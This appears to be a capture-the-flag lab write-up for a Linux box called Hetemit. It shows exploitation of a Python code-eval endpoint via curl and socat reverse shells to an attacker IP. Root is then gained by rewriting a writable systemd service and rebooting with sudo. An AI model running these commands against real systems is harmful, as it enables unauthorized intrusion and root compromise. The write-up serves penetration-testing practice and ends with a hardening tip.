# ðŸ§¬ Hetemit (Linux)
Nmap scan revealed ports 21, 22, 80, 139, 445, 18000, 50000. Port 18000 hosted a Protomba web app that requires an invite code to register, port 50000 exposes a Python API with /generate and /verify endpoints. Used /generate to create an invite code, registered on the site, but the real vulnerability was in /verify: it evaluates input as Python code. Abused it for RCE: curl -X POST --data "code=os" http://192.168.120.36:50000/verify and then got a shell with socat: nc -lvnp 18000 and curl -X POST --data "code=os.system('socat TCP:192.168.118.8:18000 EXEC:sh')" http://192.168.120.36:50000/verify. Got a shell as cmeeks. Checked for writable files: find /etc -type f -writable 2>/dev/null found /etc/systemd/system/pythonapp.service. sudo -l showed NOPASSWD for reboot. Rewrote pythonapp.service to run a root reverse shell: cat <<'EOT'> /etc/systemd/system/pythonapp.service [Unit] Description=Python App After=network-online.target [Service] Type=simple ExecStart=/home/cmeeks/reverse.sh TimeoutSec=30 RestartSec=15s User=root ExecReload=/bin/kill -USR1 $MAINPID Restart=on-failure [Install] WantedBy=multi-user.target EOT. Created the reverse shell script: cat <<'EOT'> /home/cmeeks/reverse.sh #!/bin/bash socat TCP:192.168.118.8:18000 EXEC:sh EOT && chmod +x /home/cmeeks/reverse.sh. Started a listener: nc -lvnp 18000. Rebooted the box with sudo reboot. After reboot, caught a root shell when the malicious service started. Security tip: Never leave writable systemd services or NOPASSWD sudo rights for reboot on production servers.
